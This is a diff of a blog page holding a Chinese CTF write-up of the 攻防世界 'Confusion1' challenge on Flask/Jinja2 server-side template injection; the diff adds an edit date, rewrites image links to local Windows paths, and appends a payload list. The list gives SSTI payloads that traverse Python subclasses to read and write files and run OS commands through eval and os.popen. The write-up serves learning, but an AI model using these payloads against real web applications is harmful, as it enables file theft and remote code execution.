@@ -663,10 +663,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">نُشر في</span>
-              
 
-              <time title="أُنشأ: 2022-01-08 18:34:10 / عُدل: 18:36:24" itemprop="dateCreated datePublished" datetime="2022-01-08T18:34:10+08:00">2022-01-08</time>
+              <time title="أُنشأ: 2022-01-08 18:34:10" itemprop="dateCreated datePublished" datetime="2022-01-08T18:34:10+08:00">2022-01-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">عُدل في</span>
+                <time title="عُدل: 2022-01-15 10:47:13" itemprop="dateModified" datetime="2022-01-15T10:47:13+08:00">2022-01-15</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -688,21 +694,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="攻防世界-Confusion1"><a href="#攻防世界-Confusion1" class="headerlink" title="攻防世界 Confusion1"></a>攻防世界 Confusion1</h1><p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171818134.png" alt="image-20220103171818134">打开题目是这样</p>
+          <h1 id="攻防世界-Confusion1"><a href="#攻防世界-Confusion1" class="headerlink" title="攻防世界 Confusion1"></a>攻防世界 Confusion1</h1><p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20220103171818134.png" alt="image-20220103171818134">打开题目是这样</p>
 <p>在题目描述中让我们不要使用扫描器，那我们就扫一下。</p>
-<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171853624.png" alt="image-20220103171853624"></p>
+<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20220103171853624.png" alt="image-20220103171853624"></p>
 <p>发现flag.sql</p>
 <p>随即访问</p>
-<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103171917930.png" alt="image-20220103171917930"></p>
+<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20220103171917930.png" alt="image-20220103171917930"></p>
 <p>一时没有找到什么身份伪造的办法，看看其他地方</p>
 <p>在源代码中发现注释</p>
-<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103172004765.png" alt="image-20220103172004765"></p>
+<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20220103172004765.png" alt="image-20220103172004765"></p>
 <p>访问这个地址</p>
-<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103172026796.png" alt="image-20220103172026796"></p>
+<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20220103172026796.png" alt="image-20220103172026796"></p>
 <p>获得两个提示，先记录下来，访问上面的地址也访问不了，但是查看报错页面发现这个提示在报错页面同样有。</p>
 <p>看了下wp</p>
 <p>ssti漏洞</p>
-<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/image-20220103175513573.png" alt="image-20220103175513573"></p>
+<p><img src="/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Confusion1-ssti%E6%BC%8F%E6%B4%9E%E7%B3%BB%E7%BB%9F%E8%AE%B2%E8%A7%A3/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20220103175513573.png" alt="image-20220103175513573"></p>
 <p>tplmap没弄出来，用了大佬的payload，TVTVTVTVTVTVT</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">从零学习flask模板注入 - FreeBuf网络安全行业门户</a></p>
 <p>随即学习一下模板注入</p>
@@ -731,6 +737,9 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011377996/article/details/86776181">(29条消息) SSTI模板注入_0verWatch的博客-CSDN博客_模板注入</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MIGENGKING/article/details/105717164">(29条消息) 攻防世界Web_python_template_injection_MIGENGKING的博客-CSDN博客</a></p>
 <p>简单！</p>
+<p>常见payload收集</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line">% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
